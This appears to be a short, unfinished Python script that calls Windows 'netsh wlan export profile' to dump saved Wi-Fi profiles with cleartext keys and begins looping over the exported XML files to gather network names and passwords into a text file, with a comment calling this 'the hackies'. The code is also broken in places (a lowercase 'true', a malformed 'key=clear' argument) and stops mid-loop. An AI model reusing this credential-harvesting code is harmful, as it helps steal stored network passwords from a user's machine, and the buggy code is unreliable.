import subprocess
import os

#create a fle
password_file = open('password.text', "w")
password_file.write("Your Passwords Sir\n\n")
password_file.close()

#list
wifi_files = []
wifi_name = []
wifi_password = []

#use phython to execute a window command
command = subprocess.run(["netsh", "wlan", "export", "profile", "keyclear"], capture_output= true).stdout.decode()

#grab current directory
path = os.getcwd()

#do the hackies
for filename in os.listdir(path):
    if filename.startswith("wi-fi") and filename.endswith(".xml"):